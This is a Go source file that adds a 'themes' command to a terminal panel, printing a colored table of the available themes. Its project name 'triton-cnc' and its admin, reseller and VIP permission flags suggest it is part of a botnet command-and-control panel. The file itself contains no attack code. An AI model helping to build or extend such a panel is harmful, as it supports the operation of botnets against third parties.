package util_Command

import (
	"fmt"
	"strconv"
	"strings"
	"triton-cnc/core/sessions/sessions"
	"triton-cnc/core/models/json/build"

	"github.com/alexeyco/simpletable"
)


func init() {

	Register(&Command{
		Name: "themes",

		Description: "shows all themes active on this cnc",

		Admin: false,
		Reseller: false,
		Vip: false,

		Execute: func(Session *sessions.Session_Store, cmd []string) error {

			table := simpletable.New()

			table.Header = &simpletable.Header{
					Cells: []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m#\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mName\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15mDescription\x1b[38;5;15m"},
	
				},
			}
		
	
		
			for I := 0; I < len(build.Themes.Themes); I++ {
				r := []*simpletable.Cell{
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;11m"+strconv.Itoa(I+1)+"\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+build.Themes.Themes[I].Name+"\x1b[38;5;15m"},
					{Align: simpletable.AlignCenter, Text: "\x1b[38;5;15m"+build.Themes.Themes[I].Description+"\x1b[38;5;15m"},
				}
	
				table.Body.Cells = append(table.Body.Cells, r)
			}
		
			if build.Config.Extra.TableType == "unicode" {
				table.SetStyle(simpletable.StyleUnicode)
			} else if build.Config.Extra.TableType == "lite" {
				table.SetStyle(simpletable.StyleCompactLite)
			} else {
				table.SetStyle(simpletable.StyleCompactClassic)
			}
						
			fmt.Fprint(Session.Channel, "")
			fmt.Fprintln(Session.Channel, strings.ReplaceAll(table.String(), "\n", "\r\n"))
			fmt.Fprint(Session.Channel, "\r")
			return nil

		},
	})
}